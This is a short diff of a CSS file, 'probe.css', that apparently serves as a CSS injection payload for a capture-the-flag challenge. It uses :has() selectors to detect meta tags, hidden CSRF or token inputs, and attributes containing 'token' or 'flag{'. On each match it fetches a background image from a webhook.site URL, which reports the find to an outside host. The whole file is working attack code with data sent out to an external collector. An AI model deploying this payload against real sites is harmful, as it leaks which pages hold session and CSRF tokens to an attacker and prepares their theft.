@@ -1,5 +1,24 @@
-/* hascheck.css */
-@supports selector(html:has(body)) {
-  html { background-image: url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?has=1) }
+/* probe.css */
+
+/* metas */
+html:has(meta[name*="token"]),
+html:has(meta[name*="flag"]),
+html:has(meta[content*="flag{"]) {
+  background-image:url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?found=meta)
 }
 
+/* hidden inputs (common names) */
+html:has(input[type="hidden"][name*="token"]),
+html:has(input[type="hidden"][name="_token"]),
+html:has(input[type="hidden"][name="_csrf"]),
+html:has(input[type="hidden"][name="csrfmiddlewaretoken"]),
+html:has(input[type="hidden"][name="__RequestVerificationToken"]) {
+  background-image:url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?found=hidden)
+}
+
+/* attributes anywhere that might hold it */
+html:has([data-token]), html:has([data-flag]),
+html:has([id*="token"]), html:has([class*="token"]),
+html:has([title*="flag{"]), html:has([placeholder*="flag{"]) {
+  background-image:url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?found=attr)
+}
